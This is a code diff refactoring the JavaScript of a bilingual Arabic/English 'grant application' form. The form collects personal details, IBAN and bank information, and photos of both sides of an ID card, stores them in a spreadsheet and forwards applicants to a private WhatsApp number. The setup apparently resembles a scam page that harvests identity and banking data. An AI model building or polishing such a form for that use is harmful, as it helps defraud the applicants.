@@ -21,9 +21,6 @@ document.addEventListener('DOMContentLoaded', function() {
     setupOtherFields();
 });
 
-// ================================
-// LANGUAGE
-// ================================
 function setupLanguageSwitchers() {
     document.querySelectorAll('.lang-btn').forEach(btn => {
         btn.addEventListener('click', function() {
@@ -36,11 +33,8 @@ function switchLanguage(lang) {
     currentLanguage = lang;
     document.querySelectorAll('[data-en][data-ar]').forEach(el => {
         const text = lang === 'en' ? el.getAttribute('data-en') : el.getAttribute('data-ar');
-        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
-            el.placeholder = text;
-        } else {
-            el.textContent = text;
-        }
+        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') el.placeholder = text;
+        else el.textContent = text;
     });
     document.documentElement.lang = lang;
     document.documentElement.dir = lang === 'en' ? 'ltr' : 'rtl';
@@ -49,13 +43,10 @@ function switchLanguage(lang) {
     });
 }
 
-// ================================
-// NAVIGATION
-// ================================
 function nextStep() {
     if (validateStep(currentStep)) {
         saveStepData(currentStep);
-        currentStep++;
+        currentStep = Math.min(currentStep + 1, 5);
         updateProgressBar();
         showStep(currentStep);
     }
@@ -63,33 +54,35 @@ function nextStep() {
 
 function prevStep() {
     saveStepData(currentStep);
-    currentStep--;
+    currentStep = Math.max(currentStep - 1, 1);
     updateProgressBar();
     showStep(currentStep);
 }
 
 function showStep(stepNumber) {
     document.querySelectorAll('.form-step').forEach(s => s.classList.remove('active'));
-    document.getElementById('formStep' + stepNumber).classList.add('active');
-    document.querySelector('.portal-container').scrollIntoView({ behavior: 'smooth', block: 'start' });
+    const step = document.getElementById('formStep' + stepNumber);
+    if (step) step.classList.add('active');
+    const container = document.querySelector('.portal-container');
+    if (container) container.scrollIntoView({ behavior: 'smooth', block: 'start' });
 }
 
 function updateProgressBar() {
-    document.getElementById('progressFill').style.width = (currentStep / 5 * 100) + '%';
-    for (var i = 1; i <= 5; i++) {
-        var el = document.getElementById('step' + i);
+    const progress = document.getElementById('progressFill');
+    if (progress) progress.style.width = (currentStep / 5 * 100) + '%';
+    for (let i = 1; i <= 5; i++) {
+        const el = document.getElementById('step' + i);
+        if (!el) continue;
         el.classList.remove('active', 'completed');
         if (i < currentStep) el.classList.add('completed');
         else if (i === currentStep) el.classList.add('active');
     }
 }
 
-// ================================
-// VALIDATION
-// ================================
 function validateStep(stepNumber) {
-    var isValid = true;
-    var step = document.getElementById('formStep' + stepNumber);
+    let isValid = true;
+    const step = document.getElementById('formStep' + stepNumber);
+    if (!step) return false;
 
     step.querySelectorAll('[required]').forEach(function(input) {
         if (input.type === 'file' || input.type === 'checkbox') return;
@@ -98,25 +91,24 @@ function validateStep(stepNumber) {
 
     if (stepNumber === 5) {
         ['idCardFront', 'idCardBack'].forEach(function(id) {
-            var errorEl = document.getElementById(id + 'Error');
+            const errorEl = document.getElementById(id + 'Error');
             if (!formData.attachments[id]) {
                 if (errorEl) errorEl.textContent = currentLanguage === 'ar' ? 'يرجى رفع هذه الصورة' : 'Please upload this photo';
                 isValid = false;
-            } else {
-                if (errorEl) errorEl.textContent = '';
-            }
+            } else if (errorEl) errorEl.textContent = '';
         });
-        if (!document.getElementById('terms').checked) isValid = false;
+        const terms = document.getElementById('terms');
+        if (terms && !terms.checked) isValid = false;
     }
-
     return isValid;
 }
 
 function validateField(field) {
-    var value = field.value.trim();
-    var errorEl = field.closest('.form-group') && field.closest('.form-group').querySelector('.error-message');
-    var isValid = true;
-    var msg = '';
+    const value = field.value.trim();
+    const group = field.closest('.form-group');
+    const errorEl = group && group.querySelector('.error-message');
+    let isValid = true;
+    let msg = '';
 
     if (!value) {
         isValid = false;
@@ -140,35 +132,27 @@ function validateField(field) {
     return isValid;
 }
 
-// ================================
-// SAVE STEP DATA
-// ================================
 function saveStepData(stepNumber) {
-    var step = document.getElementById('formStep' + stepNumber);
-    var groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
-    var group = groups[stepNumber];
-    if (!group) return;
+    const step = document.getElementById('formStep' + stepNumber);
+    const groups = [null, formData.personalInfo, formData.contactCareer, formData.grantDetails, formData.bankingInfo];
+    const group = groups[stepNumber];
+    if (!step || !group) return;
     step.querySelectorAll('input, select, textarea').forEach(function(input) {
         if (input.type === 'file' || input.type === 'checkbox') return;
         if (input.name) group[input.name] = input.value;
     });
 }
 
-// ================================
-// FILE UPLOAD
-// ================================
 function setupFileUpload() {
     ['idCardFront', 'idCardBack'].forEach(function(id) {
-        var input   = document.getElementById(id);
-        var preview = document.getElementById(id + 'Preview');
-        var errorEl = document.getElementById(id + 'Error');
-        var area    = document.getElementById(id + 'Area');
+        const input = document.getElementById(id);
+        const preview = document.getElementById(id + 'Preview');
+        const errorEl = document.getElementById(id + 'Error');
+        const area = document.getElementById(id + 'Area');
         if (!input) return;
-
         input.addEventListener('change', function() {
-            var file = this.files && this.files[0];
-            if (!file) return;
-            processFile(file, id, input, preview, errorEl, area);
+            const file = this.files && this.files[0];
+            if (file) processFile(file, id, input, preview, errorEl, area);
         });
     });
 }
@@ -177,122 +161,99 @@ function processFile(file, id, input, preview, errorEl, area) {
     if (file.size > 5 * 1024 * 1024) {
         if (errorEl) errorEl.textContent = 'حجم الملف أكبر من 5 ميجابايت';
         input.value = '';
+        delete formData.attachments[id];
         return;
     }
-    if (!file.type.startsWith('image/') && file.type !== 'application/pdf') {
-        if (errorEl) errorEl.textContent = 'يُسمح فقط بـ JPG أو PNG أو PDF';
+    if (!['image/jpeg', 'image/png', 'image/webp'].includes(file.type)) {
+        if (errorEl) errorEl.textContent = 'يُسمح فقط بصور JPG أو PNG أو WebP';
         input.value = '';
+        delete formData.attachments[id];
         return;
     }
     if (errorEl) errorEl.textContent = '';
     formData.attachments[id] = file;
-
-    preview.innerHTML = '<i class="fas fa-check-circle" style="color:#27ae60"></i> ' + file.name;
-    preview.style.display = 'block';
-    preview.style.padding = '0.8rem';
-    preview.style.background = '#f0fdf4';
-    preview.style.borderRadius = '8px';
-    preview.style.marginTop = '0.5rem';
+    if (preview) {
+        preview.textContent = '✓ ' + file.name;
+        preview.style.display = 'block';
+    }
     if (area) area.style.borderColor = '#27ae60';
 }
 
 function removeFile(id) {
-    var input   = document.getElementById(id);
-    var preview = document.getElementById(id + 'Preview');
-    var area    = document.getElementById(id + 'Area');
+    const input = document.getElementById(id);
+    const preview = document.getElementById(id + 'Preview');
+    const area = document.getElementById(id + 'Area');
     if (input) input.value = '';
-    if (preview) { preview.style.display = 'none'; preview.innerHTML = ''; }
+    if (preview) { preview.style.display = 'none'; preview.textContent = ''; }
     if (area) area.style.borderColor = '';
     delete formData.attachments[id];
 }
 
-// ================================
-// OTHER COUNTRY / BANK
-// ================================
 function setupOtherFields() {
-    // الدولة
-    var countrySelect = document.getElementById('country');
-    var otherCountryGroup = document.getElementById('otherCountryGroup');
-    var otherCountryInput = document.getElementById('otherCountry');
-
-    if (countrySelect) {
+    const countrySelect = document.getElementById('country');
+    const otherCountryGroup = document.getElementById('otherCountryGroup');
+    const otherCountryInput = document.getElementById('otherCountry');
+    if (countrySelect && otherCountryGroup && otherCountryInput) {
         countrySelect.addEventListener('change', function() {
-            if (this.value === 'OTHER') {
-                otherCountryGroup.style.display = 'block';
-                otherCountryInput.required = true;
-            } else {
-                otherCountryGroup.style.display = 'none';
-                otherCountryInput.required = false;
-                otherCountryInput.value = '';
-            }
+            const other = this.value === 'OTHER';
+            otherCountryGroup.style.display = other ? 'block' : 'none';
+            otherCountryInput.required = other;
+            if (!other) otherCountryInput.value = '';
         });
     }
 
-    // البنك
-    var bankSelect = document.getElementById('bankName');
-    var otherBankGroup = document.getElementById('otherBankGroup');
-    var otherBankInput = document.getElementById('otherBank');
-
-    if (bankSelect) {
+    const bankSelect = document.getElementById('bankName');
+    const otherBankGroup = document.getElementById('otherBankGroup');
+    const otherBankInput = document.getElementById('otherBank');
+    if (bankSelect && otherBankGroup && otherBankInput) {
         bankSelect.addEventListener('change', function() {
-            if (this.value === 'OTHER') {
-                otherBankGroup.style.display = 'block';
-                otherBankInput.required = true;
-            } else {
-                otherBankGroup.style.display = 'none';
-                otherBankInput.required = false;
-                otherBankInput.value = '';
-            }
+            const other = this.value === 'OTHER';
+            otherBankGroup.style.display = other ? 'block' : 'none';
+            otherBankInput.required = other;
+            if (!other) otherBankInput.value = '';
         });
     }
 }
 
-// ================================
-// IBAN FORMAT
-// ================================
 function setupIBANFormatting() {
-    var iban = document.getElementById('iban');
+    const iban = document.getElementById('iban');
     if (!iban) return;
     iban.addEventListener('input', function() {
-        var v = this.value.toUpperCase().replace(/\s/g, '');
-        if (v.length >= 2 && /^[A-Z]{2}$/.test(v.slice(0,2))) {
-    v = v.slice(0,2) + v.slice(2).replace(/[^A-Z0-9]/g, '');
-} else if (v.length < 2) {
-    v = v.replace(/[^A-Z]/g, '');
-} else {
-    v = v.replace(/[^A-Z0-9]/g, '');
-}
-v = v.slice(0, 34);
+        let v = this.value.toUpperCase().replace(/\s/g, '').replace(/[^A-Z0-9]/g, '').slice(0, 34);
         this.value = v.match(/.{1,4}/g) ? v.match(/.{1,4}/g).join(' ') : v;
     });
 }
 
-// ================================
-// SUBMIT
-// ================================
 function setupFormListeners() {
-    var submitBtn = document.getElementById('submitBtn');
+    const submitBtn = document.getElementById('submitBtn');
     if (!submitBtn) return;
 
     submitBtn.addEventListener('click', async function() {
         if (!validateStep(5)) return;
         saveStepData(5);
-
-        // تعطيل الزر أثناء الحفظ
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الحفظ...';
 
-        var txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 90000) + 10000);
+        const txNumber = 'WA-' + new Date().getFullYear() + '-' + String(Math.floor(Math.random() * 90000) + 10000);
+        let saved = false;
+        try {
+            saved = await saveToGoogleSheets(txNumber);
+        } catch (error) {
+            console.error('Application submission error:', error);
+            saved = false;
+        }
 
-        // حفظ في Supabase أولاً
-        var saved = await saveToGoogleSheets(txNumber);
-
-        // إعادة تفعيل الزر
         submitBtn.disabled = false;
         submitBtn.innerHTML = '<i class="fas fa-check-circle"></i> تقديم الطلب';
 
-        // فتح واتس آب
-        var msg = encodeURIComponent(
+        if (!saved) {
+            alert(currentLanguage === 'ar'
+                ? 'تعذر حفظ الطلب. لم يتم تسجيله بنجاح. يرجى المحاولة مرة أخرى.'
+                : 'The application could not be saved. Please try again.');
+            return;
+        }
+
+        const msg = encodeURIComponent(
             'مرحباً، لقد قمت بتقديم طلب منحة.\n' +
             'رقم المعاملة: ' + txNumber + '\n' +
             'الاسم: ' + (formData.personalInfo.fullName || '') + '\n' +
@@ -300,38 +261,32 @@ function setupFormListeners() {
             'نوع المنحة: ' + (formData.grantDetails.grantType || '') + '\n' +
             'المبلغ: ' + (formData.grantDetails.grantAmount || '') + ' ريال'
         );
-        var waUrl = 'whatsapp://send?phone=966545239928&text=' + msg;
-var waWeb = 'https://wa.me/966545239928?text=' + msg;
+        const waUrl = 'whatsapp://send?phone=966545239928&text=' + msg;
+        const waWeb = 'https://wa.me/966545239928?text=' + msg;
+        const link = document.createElement('a');
+        link.href = waUrl;
+        link.click();
+        setTimeout(function() { window.open(waWeb, '_blank'); }, 2000);
 
-// محاولة فتح التطبيق مباشرة
-var link = document.createElement('a');
-link.href = waUrl;
-link.click();
-
-// إذا لم يفتح التطبيق خلال ثانيتين افتح الويب
-setTimeout(function() {
-    window.open(waWeb, '_blank');
-}, 2000);
-
-        // إظهار رسالة النجاح
-        document.getElementById('transactionNumber').textContent = txNumber;
-        document.getElementById('successModal').classList.add('active');
+        const transactionEl = document.getElementById('transactionNumber');
+        const modal = document.getElementById('successModal');
+        if (transactionEl) transactionEl.textContent = txNumber;
+        if (modal) modal.classList.add('active');
     });
 }
 
 function redirectToWhatsApp() {
-    document.getElementById('successModal').classList.remove('active');
-    document.getElementById('grantForm').reset();
+    const modal = document.getElementById('successModal');
+    const form = document.getElementById('grantForm');
+    if (modal) modal.classList.remove('active');
+    if (form) form.reset();
     formData.attachments = {};
-    ['idCardFront', 'idCardBack'].forEach(function(id) { removeFile(id); });
+    ['idCardFront', 'idCardBack'].forEach(removeFile);
     currentStep = 1;
     updateProgressBar();
     showStep(1);
 }
 
-// Google Sheets متوفر في js/sheets.js
-
-// Validation on blur
 document.addEventListener('DOMContentLoaded', function() {
     document.querySelectorAll('input:not([type=file]), select, textarea').forEach(function(field) {
         field.addEventListener('blur', function() {
